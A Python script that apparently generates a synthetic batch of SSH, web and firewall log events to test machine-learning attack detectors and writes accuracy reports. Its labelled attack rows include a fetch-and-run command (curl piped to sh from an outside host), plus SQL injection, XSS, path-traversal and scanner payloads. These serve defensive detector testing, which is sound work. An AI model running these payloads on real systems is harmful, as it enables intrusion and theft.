from __future__ import annotations

import os
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import numpy as np
import pandas as pd
from joblib import load


PROJECT_ROOT = Path(__file__).resolve().parents[1]
CACHE_DIR = PROJECT_ROOT / ".cache"
CACHE_DIR.mkdir(parents=True, exist_ok=True)
os.environ.setdefault("MPLCONFIGDIR", str(CACHE_DIR / "matplotlib"))
os.environ.setdefault("XDG_CACHE_HOME", str(CACHE_DIR))

SRC_DIR = PROJECT_ROOT / "src"
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from cyberlog_ml.multisource_data import finalize_multisource_frame, make_record, make_web_record, username_type
from cyberlog_ml.predict_hybrid import (
    category_model_used_by_source,
    load_specialists,
    predict_categories_by_source,
    predict_with_artifact,
)


def main() -> None:
    scenario_dir = PROJECT_ROOT / "data" / "scenarios"
    report_dir = PROJECT_ROOT / "reports" / "scenario"
    models_dir = PROJECT_ROOT / "models"
    scenario_dir.mkdir(parents=True, exist_ok=True)
    report_dir.mkdir(parents=True, exist_ok=True)

    batch = build_scenario_batch()
    batch_path = scenario_dir / "mixed_shift_scenario.csv"
    batch.to_csv(batch_path, index=False)

    predictions = score_hybrid(batch, models_dir)
    predictions_path = report_dir / "mixed_shift_hybrid_predictions.csv"
    predictions.to_csv(predictions_path, index=False)

    raw_examples_path = scenario_dir / "mixed_shift_raw_examples.md"
    write_raw_examples(raw_examples_path, batch)

    summary_path = report_dir / "scenario_summary.md"
    write_summary(summary_path, batch_path, predictions_path, raw_examples_path, predictions)

    print(f"Wrote scenario batch to {batch_path}")
    print(f"Wrote hybrid predictions to {predictions_path}")
    print(f"Wrote scenario report to {summary_path}")


def build_scenario_batch() -> pd.DataFrame:
    base_time = datetime(2026, 5, 17, 9, 0, tzinfo=timezone.utc)
    records = []

    def ts(minutes: int) -> str:
        return (base_time + timedelta(minutes=minutes)).isoformat()

    records.extend(
        [
            ssh_record(
                timestamp=ts(0),
                src_ip="10.20.1.15",
                username="deploy",
                auth_result="accepted",
                failed_10m=0,
                label="normal",
                category="normal",
                message="Accepted publickey for deploy from 10.20.1.15",
            ),
            ssh_record(
                timestamp=ts(2),
                src_ip="10.20.1.15",
                username="deploy",
                auth_result="failed",
                failed_10m=1,
                label="normal",
                category="normal",
                message="Single failed password for deploy from 10.20.1.15",
            ),
            ssh_record(
                timestamp=ts(5),
                src_ip="198.51.100.44",
                username="root",
                auth_result="failed",
                failed_10m=42,
                label="attack",
                category="ssh_bruteforce",
                message="42 failed SSH passwords for root from 198.51.100.44 in 10 minutes",
            ),
            ssh_record(
                timestamp=ts(7),
                src_ip="203.0.113.88",
                username="guest",
                auth_result="failed",
                failed_10m=18,
                invalid_user=1,
                label="attack",
                category="ssh_invalid_user_scan",
                message="Invalid user guest from 203.0.113.88 repeated across accounts",
            ),
            ssh_record(
                timestamp=ts(10),
                src_ip="198.51.100.44",
                username="ubuntu",
                auth_result="accepted",
                failed_10m=35,
                success_after_failures=1,
                label="attack",
                category="ssh_suspicious_success",
                message="Accepted password for ubuntu after 35 failures from 198.51.100.44",
            ),
            ssh_record(
                timestamp=ts(12),
                src_ip="198.51.100.44",
                username="ubuntu",
                auth_result="post_auth",
                failed_10m=2,
                label="attack",
                category="ssh_post_auth_command",
                message="Post-auth command: curl -fsSL http://198.51.100.200/a.sh | sh",
            ),
        ]
    )

    records.extend(
        [
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(1),
                src_ip="10.20.1.34",
                method="GET",
                path="/dashboard",
                status=200,
                response_bytes=4812,
                user_agent="Mozilla/5.0",
                binary_label="normal",
                attack_category="normal",
                raw_message='GET /dashboard 200 "Mozilla/5.0"',
            ),
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(3),
                src_ip="10.20.1.90",
                method="GET",
                path="/health",
                status=200,
                response_bytes=128,
                user_agent="curl/8.1",
                binary_label="normal",
                attack_category="normal",
                raw_message='GET /health 200 "curl/8.1"',
            ),
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(6),
                src_ip="203.0.113.25",
                method="GET",
                path="/login?user=admin%27%20OR%20%271%27=%271",
                status=403,
                response_bytes=925,
                user_agent="sqlmap/1.7",
                binary_label="attack",
                attack_category="web_sql_injection",
                raw_message="SQL injection probe against /login",
            ),
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(8),
                src_ip="203.0.113.26",
                method="POST",
                path="/comment?text=%3Cscript%3Efetch('/token')%3C/script%3E",
                status=400,
                response_bytes=600,
                user_agent="Mozilla/5.0",
                binary_label="attack",
                attack_category="web_xss",
                raw_message="XSS payload posted to /comment",
            ),
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(9),
                src_ip="203.0.113.27",
                method="GET",
                path="/download?file=../../../../etc/passwd",
                status=403,
                response_bytes=512,
                user_agent="curl/8.1",
                binary_label="attack",
                attack_category="web_path_traversal",
                raw_message="Path traversal probe for /etc/passwd",
            ),
            make_web_record(
                source_dataset="scenario_mixed_shift",
                timestamp=ts(11),
                src_ip="203.0.113.28",
                method="GET",
                path="/.env",
                status=404,
                response_bytes=350,
                user_agent="Nikto/2.5",
                binary_label="attack",
                attack_category="web_scanner",
                raw_message="Scanner requested /.env",
            ),
        ]
    )

    records.extend(
        [
            firewall_record(
                timestamp=ts(0),
                src_ip="10.20.1.50",
                dst_port=53,
                action="allow",
                packets=16,
                total_bytes=2400,
                src_event_count=4,
                label="normal",
                category="normal",
                message="allow DNS request from workstation",
            ),
            firewall_record(
                timestamp=ts(4),
                src_ip="10.20.1.50",
                dst_port=443,
                action="allow",
                packets=34,
                total_bytes=18400,
                src_event_count=5,
                label="normal",
                category="normal",
                message="allow HTTPS session from workstation",
            ),
            firewall_record(
                timestamp=ts(5),
                src_ip="198.51.100.44",
                dst_port=22,
                action="deny",
                packets=3,
                total_bytes=420,
                src_event_count=46,
                label="attack",
                category="firewall_block",
                message="deny repeated SSH attempts from 198.51.100.44",
            ),
            firewall_record(
                timestamp=ts(6),
                src_ip="203.0.113.90",
                dst_port=3389,
                action="drop",
                packets=2,
                total_bytes=260,
                src_event_count=91,
                label="attack",
                category="firewall_port_scan",
                message="drop RDP scan from 203.0.113.90",
            ),
            firewall_record(
                timestamp=ts(13),
                src_ip="10.20.4.12",
                dst_port=31337,
                action="allow",
                packets=144,
                total_bytes=330000,
                src_event_count=28,
                label="attack",
                category="firewall_suspicious_outbound",
                message="large outbound connection to unusual port 31337",
            ),
            firewall_record(
                timestamp=ts(14),
                src_ip="203.0.113.91",
                dst_port=445,
                action="deny",
                packets=4,
                total_bytes=500,
                src_event_count=39,
                label="attack",
                category="firewall_block",
                message="deny SMB attempt from external source",
            ),
        ]
    )

    frame = finalize_multisource_frame(pd.DataFrame(records), np.random.default_rng(2026))
    frame = frame.sort_values("timestamp").reset_index(drop=True)
    frame.insert(0, "case_id", [f"case_{idx:02d}" for idx in range(1, len(frame) + 1)])
    return frame


def ssh_record(
    timestamp: str,
    src_ip: str,
    username: str,
    auth_result: str,
    failed_10m: int,
    label: str,
    category: str,
    message: str,
    invalid_user: int = 0,
    success_after_failures: int = 0,
) -> dict[str, object]:
    return make_record(
        log_source="ssh",
        source_dataset="scenario_mixed_shift",
        binary_label=label,
        attack_category=category,
        event_type="ssh_auth" if auth_result in {"accepted", "failed"} else "ssh_command",
        protocol="tcp",
        service="ssh",
        timestamp=timestamp,
        src_ip=src_ip,
        src_port=54321,
        dst_port=22,
        username=username,
        username_type=username_type(username),
        ssh_auth_result=auth_result,
        ssh_failed_logins_10m=failed_10m,
        ssh_invalid_user=invalid_user,
        ssh_privileged_username=int(username.lower() in {"root", "admin", "administrator"}),
        ssh_success_after_failures=success_after_failures,
        raw_message=message,
    )


def firewall_record(
    timestamp: str,
    src_ip: str,
    dst_port: int,
    action: str,
    packets: int,
    total_bytes: int,
    src_event_count: int,
    label: str,
    category: str,
    message: str,
) -> dict[str, object]:
    is_blocked = int(action != "allow")
    return make_record(
        log_source="firewall",
        source_dataset="scenario_mixed_shift",
        binary_label=label,
        attack_category=category,
        event_type=f"firewall_{action}",
        protocol="network",
        service="unknown",
        timestamp=timestamp,
        src_ip=src_ip,
        src_port=49152,
        dst_port=dst_port,
        firewall_action=action,
        firewall_is_allowed=int(action == "allow"),
        firewall_is_blocked=is_blocked,
        denied_admin_port=int(is_blocked and dst_port in {22, 23, 445, 3389, 5900}),
        duration_seconds=2,
        total_bytes=total_bytes,
        bytes_sent=total_bytes * 0.7,
        bytes_received=total_bytes * 0.2,
        packets=packets,
        packets_sent=packets * 0.7,
        packets_received=packets * 0.3,
        src_event_count=src_event_count,
        raw_message=message,
    )


def score_hybrid(batch: pd.DataFrame, models_dir: Path) -> pd.DataFrame:
    binary_artifact = load(models_dir / "multisource_binary_detector.joblib")
    fallback_category_artifact = load(models_dir / "multisource_attack_category_detector.joblib")
    specialist_artifacts = load_specialists(models_dir)

    scored = batch.copy()
    scored["predicted_binary_label"] = predict_with_artifact(binary_artifact, batch)
    scored["category_model_used"] = "not_run_binary_normal"
    scored["predicted_attack_category"] = "normal"
    attack_mask = scored["predicted_binary_label"].astype(str).eq("attack")
    scored.loc[attack_mask, "predicted_attack_category"] = predict_categories_by_source(
        fallback_category_artifact,
        specialist_artifacts,
        batch.loc[attack_mask],
    )
    scored.loc[attack_mask, "category_model_used"] = category_model_used_by_source(
        specialist_artifacts,
        batch.loc[attack_mask],
    )
    scored["binary_correct"] = scored["binary_label"].astype(str).eq(scored["predicted_binary_label"].astype(str))
    scored["category_correct"] = scored["attack_category"].astype(str).eq(
        scored["predicted_attack_category"].astype(str)
    )
    return scored


def write_raw_examples(path: Path, batch: pd.DataFrame) -> None:
    lines = [
        "# Mixed Shift Scenario Raw Examples",
        "",
        "This file gives a human-readable view of the normalized scenario batch.",
        "",
    ]
    for _, row in batch.iterrows():
        lines.append(
            f"- `{row['case_id']}` `{row['log_source']}` expected `{row['attack_category']}`: {row['raw_message']}"
        )
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def write_summary(
    path: Path,
    batch_path: Path,
    predictions_path: Path,
    raw_examples_path: Path,
    predictions: pd.DataFrame,
) -> None:
    binary_accuracy = predictions["binary_correct"].mean()
    category_accuracy = predictions["category_correct"].mean()
    attack_rows = predictions[predictions["binary_label"].eq("attack")]
    category_attack_accuracy = attack_rows["category_correct"].mean() if len(attack_rows) else 0

    display_cols = [
        "case_id",
        "log_source",
        "binary_label",
        "predicted_binary_label",
        "attack_category",
        "predicted_attack_category",
        "category_model_used",
    ]
    lines = [
        "# Scenario Batch Report",
        "",
        "## Scenario",
        "",
        "A mixed morning-shift batch combines SSH auth events, web-server requests, and firewall events.",
        "Some rows are single events, while brute-force and scan rows include rolling-window features such as `ssh_failed_logins_10m` and `src_event_count`.",
        "",
        "## Files",
        "",
        f"- Scenario batch: `{relative_to_project(batch_path)}`",
        f"- Raw examples: `{relative_to_project(raw_examples_path)}`",
        f"- Hybrid predictions: `{relative_to_project(predictions_path)}`",
        "",
        "## Results",
        "",
        f"- Rows scored: `{len(predictions)}`",
        f"- Expected attacks: `{int(predictions['binary_label'].eq('attack').sum())}`",
        f"- Predicted attacks: `{int(predictions['predicted_binary_label'].eq('attack').sum())}`",
        f"- Binary accuracy on this batch: `{binary_accuracy:.3f}`",
        f"- Category accuracy on all rows: `{category_accuracy:.3f}`",
        f"- Category accuracy on expected attack rows: `{category_attack_accuracy:.3f}`",
        "",
        "## Pipeline Run",
        "",
        "1. A normalized SSH/web/firewall row is created from raw logs.",
        "2. The unified binary model predicts `normal` or `attack`.",
        "3. If the row is predicted `normal`, the category stage is not run and the final category is `normal`.",
        "4. If the row is predicted `attack`, `log_source` routes it to the SSH, web, or firewall category specialist.",
        "5. If `log_source` is missing or unknown, the unified category model is used as fallback.",
        "",
        "## Prediction Table",
        "",
        markdown_table(predictions[display_cols]),
        "",
        "## Mismatches",
        "",
        mismatch_summary(predictions),
        "",
        "## How Much Data Is Needed To Decide?",
        "",
        "The model scores one normalized event row at a time, but some event rows should represent a short rolling window rather than one raw line.",
        "",
        "| Problem type | Minimum useful evidence | Stronger evidence | Why |",
        "| --- | --- | --- | --- |",
        "| SSH single login success/failure | 1 event can be scored | 5-10 minutes of user/IP history | A single failed login is often normal; repeated failures or success-after-failure changes the decision. |",
        "| SSH brute force | 5-10 failed attempts in 5-10 minutes | 20+ failed attempts or many usernames from one IP | The useful feature is a rolling count such as `ssh_failed_logins_10m`. |",
        "| Web SQLi/XSS/path traversal | 1 high-signal request can be suspicious | 5-20 requests from same IP/session | Payload tokens can be decisive, but repeated probes reduce false positives. |",
        "| Web scanner | 3-5 suspicious paths | 10+ paths like `/.env`, `/wp-login.php`, `/phpmyadmin` | Scanners are best detected by repeated path patterns. |",
        "| Firewall block | 1 deny event to sensitive ports can be suspicious | 10+ denies from same IP | One deny may be background noise; bursts are more actionable. |",
        "| Firewall port scan | 10+ denied ports or destinations | 20-50+ denied attempts in a short window | Port scans are a pattern across many events. |",
        "| Suspicious outbound firewall traffic | 1 unusual allowed connection may be reviewed | Volume, destination reputation, repeated connections | Context matters; byte/packet volume and destination behavior help. |",
        "",
        "Practical default: aggregate raw logs into 5-minute and 10-minute windows per source IP, username, URL path, destination port, and action. Then score the resulting normalized rows.",
    ]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def mismatch_summary(predictions: pd.DataFrame) -> str:
    mismatches = predictions[
        ~(
            predictions["binary_correct"].astype(bool)
            & predictions["category_correct"].astype(bool)
        )
    ]
    if mismatches.empty:
        return "No mismatches in this scenario batch."

    lines = []
    for _, row in mismatches.iterrows():
        if row["predicted_binary_label"] == "normal" and row["binary_label"] == "attack":
            reason = "The first-pass binary detector stopped the second pass, so the specialist category model never ran."
        elif row["predicted_binary_label"] == "attack" and row["binary_label"] == "normal":
            reason = "The first-pass binary detector raised an attack where the scenario label says normal."
        else:
            reason = "The first pass detected an attack, but the specialist chose a different category."
        lines.append(
            f"- `{row['case_id']}` expected `{row['attack_category']}`, predicted "
            f"`{row['predicted_attack_category']}`. {reason}"
        )
    return "\n".join(lines)


def markdown_table(df: pd.DataFrame) -> str:
    columns = df.columns.tolist()
    lines = [
        "| " + " | ".join(columns) + " |",
        "| " + " | ".join(["---"] * len(columns)) + " |",
    ]
    for _, row in df.iterrows():
        values = [str(row[col]).replace("|", "/") for col in columns]
        lines.append("| " + " | ".join(values) + " |")
    return "\n".join(lines)


def relative_to_project(path: Path) -> str:
    try:
        return str(path.relative_to(PROJECT_ROOT))
    except ValueError:
        return str(path)


if __name__ == "__main__":
    main()
